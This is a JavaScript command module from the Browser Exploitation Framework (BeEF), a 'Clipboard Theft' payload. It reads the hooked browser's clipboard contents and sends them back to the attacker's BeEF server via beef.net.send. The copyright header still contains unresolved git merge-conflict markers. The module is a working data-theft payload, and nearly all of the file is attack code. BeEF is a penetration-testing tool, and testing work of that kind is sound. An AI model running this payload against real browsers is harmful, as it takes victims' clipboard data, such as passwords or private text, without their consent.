//
<<<<<<< HEAD
// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  try {
    var clipboard = clipboardData.getData("Text");
    beef.debug("[Clipboard Theft] Success: Retrieved clipboard contents (" + clipboard.length + ' bytes)');
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard="+clipboard, beef.are.status_success());
  } catch (e) {
    beef.debug("[Clipboard Theft] Error: Could not retrieve clipboard contents");
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=clipboardData.getData is not supported.", beef.are.status_error());
  }
});
